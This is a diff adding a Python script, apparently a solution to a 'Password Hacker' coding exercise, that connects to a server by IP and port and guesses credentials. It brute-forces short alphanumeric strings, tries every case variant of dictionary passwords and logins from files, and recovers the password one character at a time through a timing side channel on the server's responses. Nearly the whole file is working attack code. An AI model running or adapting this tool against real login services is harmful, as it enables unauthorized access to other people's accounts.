@@ -1,0 +1,100 @@
+if __name__ == '__main__':
+    import argparse
+    import socket
+    import itertools
+    import json
+    import time
+
+    def bruteforce():
+        _alfavit = []
+        for i in range(97, 123):
+            _alfavit += (chr(i))
+        for i in range(48, 58):
+            _alfavit += (chr(i))
+        for _i in range(1, 6):
+            for v in itertools.combinations(_alfavit, _i):
+                podbor = (''.join(v)).encode()
+                sakit.send(podbor)
+                otvet = sakit.recv(1024)
+                otvet = otvet.decode()
+                if otvet == 'Too many attempts':
+                    return otvet
+                if otvet == 'Connection success!':
+                    print(podbor.decode())
+                    return otvet
+
+    def smartforce():
+        with open('passwords.txt', 'rt') as spisok:
+            _stroke = spisok.readlines()
+            spisok.close()
+        _stroke = [ele.strip('\n') for ele in _stroke]
+        for slovo in _stroke:
+            hui = map(lambda x: ''.join(x), itertools.product(*([bukva.lower(), bukva.upper()] for bukva in slovo)))
+            for _i in hui:
+                podbor = _i
+                podbor = podbor.encode()
+                sakit.send(podbor)
+                otvet = sakit.recv(1024)
+                otvet = otvet.decode()
+                if otvet == 'Too many attempts':
+                    return otvet
+                if otvet == 'Connection success!':
+                    print(podbor.decode())
+                    return otvet
+
+    def podbor_logina():
+        with open('D:\\1PyCharm\\Password Hacker\\Password Hacker\\task\\logins.txt', 'rt') as logini:
+            _stroki = logini.readlines()
+            logini.close()
+        _stroki = [ele.strip('\n') for ele in _stroki]
+        for slovo in _stroki:
+            yo = map(lambda x: ''.join(x), itertools.product(*([bukva.lower(), bukva.upper()] for bukva in slovo)))
+            for _i in yo:
+                stroka_json = json.dumps({"login": str(_i), "password": ' '})
+                stroka_json = stroka_json.encode()
+                sakit.send(stroka_json)
+                otvet = sakit.recv(1024)
+                otvet = otvet.decode()
+                otvet_json = json.loads(otvet)
+                if otvet_json['result'] == 'Wrong password!':
+                    return _i
+        print('Login ne naiden :(')
+        return None
+
+    def podbor_parolya():
+        global login
+        _alfavit = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+        _parol = ''
+        for _i in range(1, 14):
+            for v in _alfavit:
+                start_timer = time.perf_counter()
+                bukva_json = json.dumps({"login": str(login), "password": _parol + v})
+                bukva_json = bukva_json.encode()
+                sakit.send(bukva_json)
+                otvet = sakit.recv(1024)
+                otvet = otvet.decode()
+                otvet_json = json.loads(otvet)
+                stop_timer = time.perf_counter()
+                if otvet_json['result'] == 'Connection success!':
+                    return _parol + v
+                elif (stop_timer - start_timer) >= 0.05:
+                    _parol += v
+                    break
+        print('Parol ne naiden :(')
+        return None
+
+
+    # ------- S T A R T -------
+    argumenti = argparse.ArgumentParser()
+    argumenti.add_argument('ip')
+    argumenti.add_argument('port')
+    oook = argumenti.parse_args()
+    sakit = socket.socket()
+    sakit.connect((oook.ip, int(oook.port)))
+
+    login = podbor_logina()
+    if login:
+        parol = podbor_parolya()
+        print(json.dumps({"login": login, "password": parol}))
+
+    sakit.close()
